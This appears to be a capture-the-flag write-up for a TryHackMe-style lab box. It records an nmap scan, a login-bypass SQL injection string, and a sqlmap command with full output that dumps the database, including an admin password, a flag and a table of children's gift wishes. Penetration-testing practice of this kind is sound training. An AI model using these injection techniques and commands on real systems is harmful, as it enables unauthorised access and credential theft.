@@ -1,0 +1,260 @@
+export IP=10.10.27.59
+
+(insert name of room or box)
+============================
+
+> labruhtoryboi | December 5, 2020
+
+
+# 10.10.57.99
+
+
+					# reconnisance
+
+'''
+nmap -sC -sV -oN nmapinit.txt $IP
+'''
+
+'''
+Nmap scan report for 10.10.27.59
+Host is up (0.24s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 35:30:91:45:b9:d1:ed:5a:13:42:3e:20:95:6d:c7:b7 (RSA)
+|   256 f5:69:6a:7b:c8:ac:89:b5:38:93:50:2f:05:24:22:70 (ECDSA)
+|_  256 8f:4d:37:ba:40:12:05:fa:f0:e6:d6:82:fb:65:52:e8 (ED25519)
+3000/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.12)
+|_http-title: Really Insecure PHP Page
+3306/tcp open  mysql   MySQL 8.0.22
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.22
+|   Thread ID: 26
+|   Capabilities flags: 65535
+|   Some Capabilities: InteractiveClient, IgnoreSigpipes, SwitchToSSLAfterHandshake, ODBCClient, Speaks41ProtocolOld, FoundRows, SupportsLoadDataLocal, Support41Auth, LongColumnFlag, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase, SupportsTransactions, IgnoreSpaceBeforeParenthesis, LongPassword, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: n\x10XF}%2\x0F_{\x05vAoCl\x11yU\x1A
+|_  Auth Plugin Name: caching_sha2_password
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.22_Auto_Generated_Server_Certificate
+| Not valid before: 2020-11-19T19:12:24
+|_Not valid after:  2030-11-17T19:12:24
+|_ssl-date: TLS randomness does not represent time
+8000/tcp open  http    Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Santa's forum
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+'''
+
+					# enumeration
+
+'''
+https://10.10.27.59:3000/santapanel
+'''
+
+'''
+login page
+'''
+
+
+					# exploitation (login panel)
+
+'''
+admin' or 1=1 --
+admin
+'''
+
+
+
+					# exploitation (db)
+					
+*capture request with zap and integrate sqlmap 
+
+'''
+sqlmap -r panel.request --tamper=space2comment --dump-all --dbms sqlite
+'''
+
+'''
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:54:58 /2020-12-05/
+
+[11:54:58] [INFO] parsing HTTP request from 'panel.request'
+[11:54:58] [INFO] loading tamper module 'space2comment'
+you provided 'SQLite' as a back-end DBMS, but from a past scan information on the target URL sqlmap assumes the back-end DBMS is 'mysql'. Do you really want to force the back-end DBMS value? [y/N] y
+[11:55:11] [INFO] testing connection to the target URL
+[11:55:12] [INFO] testing if the target URL content is stable
+[11:55:12] [INFO] target URL content is stable
+[11:55:12] [INFO] testing if GET parameter 'search' is dynamic
+[11:55:12] [WARNING] GET parameter 'search' does not appear to be dynamic
+[11:55:13] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
+[11:55:13] [INFO] testing for SQL injection on GET parameter 'search'
+[11:55:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:55:14] [WARNING] reflective value(s) found and filtering out
+[11:55:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[11:55:17] [INFO] testing 'Generic inline queries'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
+[11:55:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[11:55:24] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[11:55:25] [INFO] target URL appears to have 2 columns in query
+[11:55:26] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
+[11:55:26] [INFO] checking if the injection point on GET parameter 'search' is a false positive
+[11:55:28] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: search=hello' UNION ALL SELECT 'qqzpq'||'UxfCSpTRdnjhHOCPAAWTFvsfIMFlkRtoiNFFflko'||'qzqbq',NULL-- iWLK
+---
+[11:55:46] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[11:55:46] [INFO] testing SQLite
+[11:55:47] [INFO] confirming SQLite
+[11:55:47] [INFO] actively fingerprinting SQLite
+[11:55:47] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[11:55:47] [INFO] sqlmap will dump entries of all tables from all databases now
+[11:55:47] [INFO] fetching tables for database: 'SQLite_masterdb'
+[11:55:47] [INFO] fetching columns for table 'users' in database 'SQLite_masterdb'
+[11:55:48] [INFO] fetching entries for table 'users' in database 'SQLite_masterdb'
+Database: SQLite_masterdb
+Table: users
+[1 entry]
++------------------+----------+
+| password         | username |
++------------------+----------+
+| EhCNSWzzFP6sc7gB | admin    |
++------------------+----------+
+
+[11:55:48] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.27.59/dump/SQLite_masterdb/users.csv'
+[11:55:48] [INFO] fetching columns for table 'hidden_table' in database 'SQLite_masterdb'
+[11:55:48] [INFO] fetching entries for table 'hidden_table' in database 'SQLite_masterdb'
+Database: SQLite_masterdb
+Table: hidden_table
+[1 entry]
++-----------------------------------------+
+| flag                                    |
++-----------------------------------------+
+| thmfox{All_I_Want_for_Christmas_Is_You} |
++-----------------------------------------+
+
+[11:55:49] [INFO] table 'SQLite_masterdb.hidden_table' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.27.59/dump/SQLite_masterdb/hidden_table.csv'
+[11:55:49] [INFO] fetching columns for table 'sequels' in database 'SQLite_masterdb'
+[11:55:49] [INFO] fetching entries for table 'sequels' in database 'SQLite_masterdb'
+Database: SQLite_masterdb
+Table: sequels
+[22 entries]
++-------------+-----+----------------------------+
+| kid         | age | title                      |
++-------------+-----+----------------------------+
+| James       | 8   | shoes                      |
+| John        | 4   | skateboard                 |
+| Robert      | 17  | iphone                     |
+| Michael     | 5   | playstation                |
+| William     | 6   | xbox                       |
+| David       | 6   | candy                      |
+| Richard     | 9   | books                      |
+| Joseph      | 7   | socks                      |
+| Thomas      | 10  | 10 McDonalds meals         |
+| Charles     | 3   | toy car                    |
+| Christopher | 8   | air hockey table           |
+| Daniel      | 12  | lego star wars             |
+| Matthew     | 15  | bike                       |
+| Anthony     | 3   | table tennis               |
+| Donald      | 4   | fazer chocolate            |
+| Mark        | 17  | wii                        |
+| Paul        | 9   | github ownership           |
+| James       | 8   | finnish-english dictionary |
+| Steven      | 11  | laptop                     |
+| Andrew      | 16  | rasberry pie               |
+| Kenneth     | 19  | TryHackMe Sub              |
+| Joshua      | 12  | chair                      |
++-------------+-----+----------------------------+
+
+[11:55:49] [INFO] table 'SQLite_masterdb.sequels' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.27.59/dump/SQLite_masterdb/sequels.csv'
+[11:55:49] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 1 times
+[11:55:49] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.27.59'
+
+[*] ending @ 11:55:49 /2020-12-05/
+
+'''
+
+
+
+
+
+
+					# interesting things
+
+>flags
+'''
+thmfox{All_I_Want_for_Christmas_Is_You}
+'''
+
+>users
+'''
+admin
+'''
+
+>passwds
+'''
+EhCNSWzzFP6sc7gB
+'''
+
+>files and dirs (database entries)
+'''
+Table: sequels
+[22 entries]
++-------------+-----+----------------------------+
+| kid         | age | title                      |
++-------------+-----+----------------------------+
+| James       | 8   | shoes                      |
+| John        | 4   | skateboard                 |
+| Robert      | 17  | iphone                     |
+| Michael     | 5   | playstation                |
+| William     | 6   | xbox                       |
+| David       | 6   | candy                      |
+| Richard     | 9   | books                      |
+| Joseph      | 7   | socks                      |
+| Thomas      | 10  | 10 McDonalds meals         |
+| Charles     | 3   | toy car                    |
+| Christopher | 8   | air hockey table           |
+| Daniel      | 12  | lego star wars             |
+| Matthew     | 15  | bike                       |
+| Anthony     | 3   | table tennis               |
+| Donald      | 4   | fazer chocolate            |
+| Mark        | 17  | wii                        |
+| Paul        | 9   | github ownership           |
+| James       | 8   | finnish-english dictionary |
+| Steven      | 11  | laptop                     |
+| Andrew      | 16  | rasberry pie               |
+| Kenneth     | 19  | TryHackMe Sub              |
+| Joshua      | 12  | chair                      |
++-------------+-----+----------------------------+
+
+Table: hidden_table
+[1 entry]
++-----------------------------------------+
+| flag                                    |
++-----------------------------------------+
+| thmfox{All_I_Want_for_Christmas_Is_You} |
++-----------------------------------------+
+
+Table: users
+[1 entry]
++------------------+----------+
+| password         | username |
++------------------+----------+
+| EhCNSWzzFP6sc7gB | admin    |
++------------------+----------+
+'''
